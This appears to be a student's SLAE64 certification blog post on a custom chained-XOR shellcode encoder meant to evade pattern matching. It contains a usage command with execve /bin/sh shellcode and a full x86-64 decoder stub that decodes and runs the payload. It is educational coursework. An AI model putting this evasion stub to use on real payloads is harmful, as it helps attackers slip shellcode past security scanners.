# Custom Encoder

This assignment was about implementing a custom encoder that encodes a shellcode so that it bypasses pattern matching and keeps the reverse engineers busy for a while.

Many encoders already exist: rotencoder, caesar encoder or xor encoder to name a few.
I decided to implement an encoder that that takes a one byte seed as an argument and xors the first byte with this seed. The result of this operation is then used to xor the next byte and so on.

```
            +-------------+--------------+
            |    byte 1   |    byte 2    |
            +------+------+------+-------+
                   |             |
                   v             v
      Seed      +--+--+       +--+--+
+-------------->+ XOR +-------> XOR +---------->
                +--+--+       +--+--+
                   |             |
                   |             |
            +------v------+------v-------+
            |  Encoded 1  |  Encoded 2   |
            +-------------+--------------+
```

The encoder is implemented in python and can be used like this:
```
python2 Encoder.py -sh "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05" -k "A"
```

-sh is the original shellcode
-k is the seed

It produces a .asm file that contains the decoding routine and then executes the decoded shellcode.

## Decoder

```
KEY equ 'A'
LEN equ 32
global _start:
section .text

_start:
    jmp _get_pointer ; use call pop technique to get a pointer to the encoded shellcode

_decode:
    pop rdi ; rdi points to encodedshellcode

    push KEY
    pop rsi ; rsi contains the key
    xor rax, rax
    xor rcx, rcx
    cdq ; rax, rcx and rdx are 0

_loop: ; loop over the encoded shellcode and undo the encoding

    cmp rcx, LEN
    jg EncodedShellcode ; if this branch is taken the decoding is done and the shellcode can be executed

    mov al, [rdi]
    xor al, sil
    mov sil, [rdi]
    mov [rdi], al


    inc rdi
    inc rcx
    jmp _loop

_get_pointer:
    call _decode
    EncodedShellcode: db 0x9,0x38,0xf8,0xa8,0xe0,0x5b,0x74,0x16,0x7f,0x11,0x3e,0x11,0x62,0xa,0x59,0x11,0x98,0x7f,0x2f,0x67,0xee,0xc,0x5b,0x13,0x9a,0x7c,0x34,0xb7,0x77,0x4c,0x43,0x46
```


This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student ID: SLAE64-1581
